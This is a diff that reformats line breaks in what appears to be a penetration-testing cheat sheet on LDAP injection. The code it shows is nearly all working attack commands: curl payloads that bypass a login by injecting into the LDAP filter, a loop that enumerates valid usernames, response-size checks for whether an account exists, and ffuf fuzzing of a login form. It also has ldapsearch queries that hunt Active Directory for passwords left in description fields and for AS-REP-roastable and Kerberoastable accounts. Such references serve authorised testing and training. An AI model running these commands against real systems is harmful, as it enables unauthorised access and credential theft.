@@ -63,15 +63,10 @@ LDAP queries built from unsanitized user input allow filter manipulation — aut
 
 ```python
 # Test via curl
-curl -s -X POST "http://<target>/login" \
-  -d "username=admin)(%26&password=anything" \
-  --data-urlencode "username=admin)(&" \
-  --data-urlencode "password=anything"
+curl -s -X POST "http://<target>/login" -d "username=admin)(%26&password=anything" --data-urlencode "username=admin)(&" --data-urlencode "password=anything"
 
 # application/json body
-curl -s -X POST "http://<target>/api/login" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin)(&","password":"anything"}'
+curl -s -X POST "http://<target>/api/login" -H "Content-Type: application/json" -d '{"username":"admin)(&","password":"anything"}'
 ```
 
 ---
@@ -86,9 +81,7 @@ curl -s -X POST "http://<target>/api/login" \
 
 # Script to enumerate users
 for prefix in a b c d e f admin user test root john; do
-  resp=$(curl -s -X POST "http://<target>/login" \
-    --data-urlencode "username=${prefix}*)(&" \
-    --data-urlencode "password=x")
+  resp=$(curl -s -X POST "http://<target>/login" --data-urlencode "username=${prefix}*)(&" --data-urlencode "password=x")
   if echo "$resp" | grep -qv "invalid\|error\|fail"; then
     echo "[+] Prefix '$prefix' matches a valid user"
   fi
@@ -175,13 +168,9 @@ EOF
 # - Error message difference
 
 # Check if user exists at all:
-curl -s -X POST "http://<target>/login" \
-  --data-urlencode "username=admin" \
-  --data-urlencode "password=*" | wc -c
+curl -s -X POST "http://<target>/login" --data-urlencode "username=admin" --data-urlencode "password=*" | wc -c
 # vs
-curl -s -X POST "http://<target>/login" \
-  --data-urlencode "username=doesnotexist12345" \
-  --data-urlencode "password=*" | wc -c
+curl -s -X POST "http://<target>/login" --data-urlencode "username=doesnotexist12345" --data-urlencode "password=*" | wc -c
 # Size difference = user exists check
 ```
 
@@ -223,25 +212,17 @@ set USERNAME admin
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 
 # ldapsearch — enumerate after auth bypass
-ldapsearch -x -H ldap://<target> -D "cn=admin,dc=target,dc=com" -w "password" \
-  -b "dc=target,dc=com" "(objectClass=*)"
+ldapsearch -x -H ldap://<target> -D "cn=admin,dc=target,dc=com" -w "password" -b "dc=target,dc=com" "(objectClass=*)"
 
 # LDAPDomainDump — enumerate AD via LDAP
 ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>
 
 # Manual auth bypass test with ldapsearch filter
-ldapsearch -x -H ldap://<target> \
-  -b "dc=target,dc=com" \
-  "(&(uid=admin)(userPassword=*))"
+ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(&(uid=admin)(userPassword=*))"
 
 # BurpSuite — intruder on login with LDAP payloads from SecLists:
 # /usr/share/seclists/Fuzzing/LDAP.Injection.Fuzz.Strings.txt
-ffuf -w /usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt \
-  -u "http://<target>/login" \
-  -X POST \
-  -d "username=FUZZ&password=test" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -mr "Welcome|Dashboard|Success" -v
+ffuf -w /usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt -u "http://<target>/login" -X POST -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" -mr "Welcome|Dashboard|Success" -v
 ```
 
 ---
@@ -256,22 +237,13 @@ ffuf -w /usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt \
 # Same techniques — inject into search filters
 
 # Password in description (common misconfiguration)
-ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
-  -b "dc=<domain>,dc=com" \
-  "(&(objectClass=user))" \
-  description | grep -i "pass\|pwd\|cred"
+ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user))" description | grep -i "pass\|pwd\|cred"
 
 # Users with no pre-auth required (ASREPRoastable)
-ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
-  -b "dc=<domain>,dc=com" \
-  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
-  sAMAccountName
+ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
 
 # Kerberoastable users (servicePrincipalName set)
-ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" \
-  -b "dc=<domain>,dc=com" \
-  "(&(objectClass=user)(servicePrincipalName=*))" \
-  sAMAccountName servicePrincipalName
+ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
 ```
 
 ---
